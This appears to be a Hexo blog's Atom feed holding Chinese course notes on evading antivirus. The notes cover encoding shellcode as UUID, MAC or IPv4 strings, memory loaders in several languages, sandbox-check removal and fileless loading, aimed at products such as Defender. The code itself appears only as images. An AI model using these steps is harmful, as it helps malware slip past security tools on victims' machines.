<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ai潼</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-01-17T05:16:11.556Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>pwy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/05/12/hello-world/"/>
    <id>http://example.com/2023/05/12/hello-world/</id>
    <published>2023-05-12T15:24:14.066Z</published>
    <updated>2023-01-17T05:16:11.556Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</title>
    <link href="http://example.com/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/"/>
    <id>http://example.com/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/</id>
    <published>2023-04-27T00:35:05.000Z</published>
    <updated>2023-05-12T08:45:20.943Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/HiSMs9ojCRUMQ2C40-fBqQ.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、内存加载-UUID地址-ShellCode转换</p><p>2、内存加载-MAC地址-ShellCode转换</p><p>3、内存加载-IPV4地址-ShellCode转换</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h5 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h5><p>X60 Defender 某绒 管家 VT等</p><h5 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h5><p>C&#x2F;C++ Python C# Go Powershell Ruby Java ASM NIM Vlang等。</p><h5 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h5><p>ShellCode混淆，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/Nn-mppar3bb7YDktbGdnAA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><em>演示案例：</em></h3><h4 id="➢-内存加载-UUID地址-ShellCode-转换"><a href="#➢-内存加载-UUID地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-UUID地址-ShellCode**转换"></a>➢ <em>内存加载-UUID地址-ShellCode**转换</em></h4><h4 id="➢-内存加载-MAC地址-ShellCode-转换"><a href="#➢-内存加载-MAC地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-MAC地址-ShellCode**转换"></a>➢ <em>内存加载-MAC地址-ShellCode**转换</em></h4><h4 id="➢-内存加载-IPV4地址-ShellCode-转换"><a href="#➢-内存加载-IPV4地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-IPV4地址-ShellCode**转换"></a>➢ <em>内存加载-IPV4地址-ShellCode**转换</em></h4></blockquote><h5 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h5><p><a href="https://www.anquanke.com/post/id/262666">CS shellcode内存加载器免杀及实现-安全客 - 安全资讯平台 (anquanke.com)</a></p><h6 id="之前的是将shellcode写入内存，本节课是封装好shellcod写入内存"><a href="#之前的是将shellcode写入内存，本节课是封装好shellcod写入内存" class="headerlink" title="之前的是将shellcode写入内存，本节课是封装好shellcod写入内存"></a>之前的是将shellcode写入内存，本节课是封装好shellcod写入内存</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512144512182.png" alt="image-20230512144512182"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162055001.png" alt="image-20230512162055001"></p><h3 id="内存加载-UUID方式-ShellCode转换"><a href="#内存加载-UUID方式-ShellCode转换" class="headerlink" title="#内存加载-UUID方式-ShellCode转换"></a>#内存加载-UUID方式-ShellCode转换</h3><p>通用唯一识别码(UUID),是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。</p><h6 id="演示加载语言：C-C-Python2-Go"><a href="#演示加载语言：C-C-Python2-Go" class="headerlink" title="演示加载语言：C++ C# Python2 Go"></a>演示加载语言：C++ C# Python2 Go</h6><h6 id="生成两个位数的文件"><a href="#生成两个位数的文件" class="headerlink" title="生成两个位数的文件"></a>生成两个位数的文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512154730691.png" alt="image-20230512154730691"></p><h6 id="利用python脚本将shellcode转化成uuid的字符串，将payload-c里面的shellcode替换到此处"><a href="#利用python脚本将shellcode转化成uuid的字符串，将payload-c里面的shellcode替换到此处" class="headerlink" title="利用python脚本将shellcode转化成uuid的字符串，将payload.c里面的shellcode替换到此处"></a>利用python脚本将shellcode转化成uuid的字符串，将payload.c里面的shellcode替换到此处</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155226978.png" alt="image-20230512155226978"></p><h6 id="执行打印出shellcode的uuid字符串"><a href="#执行打印出shellcode的uuid字符串" class="headerlink" title="执行打印出shellcode的uuid字符串"></a>执行打印出shellcode的uuid字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155400752.png" alt="image-20230512155400752"></p><h6 id="上面的链接中给出了用：C-C-Python2-Go写的uuid加载内存的代码"><a href="#上面的链接中给出了用：C-C-Python2-Go写的uuid加载内存的代码" class="headerlink" title="上面的链接中给出了用：C++ C# Python2 Go写的uuid加载内存的代码"></a>上面的链接中给出了用：C++ C# Python2 Go写的uuid加载内存的代码</h6><h5 id="1、C-："><a href="#1、C-：" class="headerlink" title="1、C++："></a>1、C++：</h5><h6 id="将生成的uuid的shellcode字符串写到此处"><a href="#将生成的uuid的shellcode字符串写到此处" class="headerlink" title="将生成的uuid的shellcode字符串写到此处"></a>将生成的uuid的shellcode字符串写到此处</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155740713.png" alt="image-20230512155740713"></p><h6 id="尝试执行成功上线"><a href="#尝试执行成功上线" class="headerlink" title="尝试执行成功上线"></a>尝试执行成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155907968.png" alt="image-20230512155907968"></p><h6 id="生成exe文件"><a href="#生成exe文件" class="headerlink" title="生成exe文件"></a>生成exe文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160038610.png" alt="image-20230512160038610"></p><h5 id="2、C"><a href="#2、C" class="headerlink" title="2、C#"></a>2、C#</h5><h6 id="同样生成uuid的shellcode字符串"><a href="#同样生成uuid的shellcode字符串" class="headerlink" title="同样生成uuid的shellcode字符串"></a>同样生成uuid的shellcode字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160454999.png" alt="image-20230512160454999"></p><h6 id="同样在上线C-代码中替换掉shellcode"><a href="#同样在上线C-代码中替换掉shellcode" class="headerlink" title="同样在上线C#代码中替换掉shellcode"></a>同样在上线C#代码中替换掉shellcode</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160626649.png" alt="image-20230512160626649"></p><h5 id="3、python2"><a href="#3、python2" class="headerlink" title="3、python2"></a>3、python2</h5><h6 id="python可以直接将pyload-c里面的shellcode替换到python的uuid转换代码中"><a href="#python可以直接将pyload-c里面的shellcode替换到python的uuid转换代码中" class="headerlink" title="python可以直接将pyload.c里面的shellcode替换到python的uuid转换代码中"></a>python可以直接将pyload.c里面的shellcode替换到python的uuid转换代码中</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160823185.png" alt="image-20230512160823185"></p><h6 id="执行脚本转换"><a href="#执行脚本转换" class="headerlink" title="执行脚本转换"></a>执行脚本转换</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160951948.png" alt="image-20230512160951948"></p><h6 id="将其上面shellcode的uuid字符串复制到执行上线的代码里面"><a href="#将其上面shellcode的uuid字符串复制到执行上线的代码里面" class="headerlink" title="将其上面shellcode的uuid字符串复制到执行上线的代码里面"></a>将其上面shellcode的uuid字符串复制到执行上线的代码里面</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161352812.png" alt="image-20230512161352812"></p><h6 id="执行代码，未上线，是因为用的是Python3版本"><a href="#执行代码，未上线，是因为用的是Python3版本" class="headerlink" title="执行代码，未上线，是因为用的是Python3版本"></a>执行代码，未上线，是因为用的是Python3版本</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161556634.png" alt="image-20230512161556634"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161737140.png" alt="image-20230512161737140"></p><h6 id="换成python2版本执行成功上线"><a href="#换成python2版本执行成功上线" class="headerlink" title="换成python2版本执行成功上线"></a>换成python2版本执行成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161848313.png" alt="image-20230512161848313"></p><h6 id="用Pyinstaller打包exe"><a href="#用Pyinstaller打包exe" class="headerlink" title="用Pyinstaller打包exe"></a>用Pyinstaller打包exe</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161949933.png" alt="image-20230512161949933"></p><h6 id="由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了"><a href="#由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了" class="headerlink" title="由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了"></a>由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162557113.png" alt="image-20230512162557113"></p><h5 id="4、GO语言："><a href="#4、GO语言：" class="headerlink" title="4、GO语言："></a>4、GO语言：</h5><h6 id="生成shellcode的uuid字符串"><a href="#生成shellcode的uuid字符串" class="headerlink" title="生成shellcode的uuid字符串"></a>生成shellcode的uuid字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162845095.png" alt="image-20230512162845095"></p><h6 id="替换到go的上线执行代码中"><a href="#替换到go的上线执行代码中" class="headerlink" title="替换到go的上线执行代码中"></a>替换到go的上线执行代码中</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163007961.png" alt="image-20230512163007961"></p><h6 id="运行后成功上线"><a href="#运行后成功上线" class="headerlink" title="运行后成功上线"></a>运行后成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163049294.png" alt="image-20230512163049294"></p><h6 id="执行命令编译成exe文件"><a href="#执行命令编译成exe文件" class="headerlink" title="执行命令编译成exe文件"></a>执行命令编译成exe文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163123250.png" alt="image-20230512163123250"></p><p>发现将其放到虚拟机里面执行后无法上线，因为执行代码里面检测cpu核数和物理内存</p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163806607.png" alt="image-20230512163806607"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163328120.png" alt="image-20230512163328120"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163833529.png" alt="image-20230512163833529"></p><h6 id="先直接把main函数执行这两个地方的代码注释后重新打包"><a href="#先直接把main函数执行这两个地方的代码注释后重新打包" class="headerlink" title="先直接把main函数执行这两个地方的代码注释后重新打包"></a>先直接把main函数执行这两个地方的代码注释后重新打包</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163930294.png" alt="image-20230512163930294"></p><h6 id="再次执行exe就成功上线了"><a href="#再次执行exe就成功上线了" class="headerlink" title="再次执行exe就成功上线了"></a>再次执行exe就成功上线了</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164303212.png" alt="image-20230512164303212"></p><h6 id="上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）"><a href="#上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）" class="headerlink" title="上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）"></a>上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164400258.png" alt="image-20230512164400258"></p><h6 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164448705.png" alt="image-20230512164448705"></p><h3 id="内存加载-MAC地址-ShellCode转换"><a href="#内存加载-MAC地址-ShellCode转换" class="headerlink" title="#内存加载-MAC地址-ShellCode转换"></a>#内存加载-MAC地址-ShellCode转换</h3><p>MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的。</p><p>演示加载语言：Python2 Go</p><h3 id="内存加载-IPV4方式-ShellCode转换"><a href="#内存加载-IPV4方式-ShellCode转换" class="headerlink" title="#内存加载-IPV4方式-ShellCode转换"></a>#内存加载-IPV4方式-ShellCode转换</h3><p>IPv4是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽最大努力交付数据包，意即它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4使用32位（4字节）地址。</p><p>演示加载语言：Go</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</title>
    <link href="http://example.com/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/"/>
    <id>http://example.com/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/</id>
    <published>2023-04-27T00:34:45.000Z</published>
    <updated>2023-05-12T05:50:41.474Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/8i3IGPgDn9GeJQ6a1zq34Q.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、无文件落地&amp;分离拆分-将shellcode从文本中提取-file</p><p>2、无文件落地&amp;分离拆分-将shellcode与加载器分离-argv</p><p>3、无文件落地&amp;分离拆分-将shellcode远程协议加载-http</p><p>4、无文件落地&amp;分离拆分-将shellcode通过管道传输-socket</p><p>5、无文件落地&amp;分离拆分-将shellcode隐写进图片内-images</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" 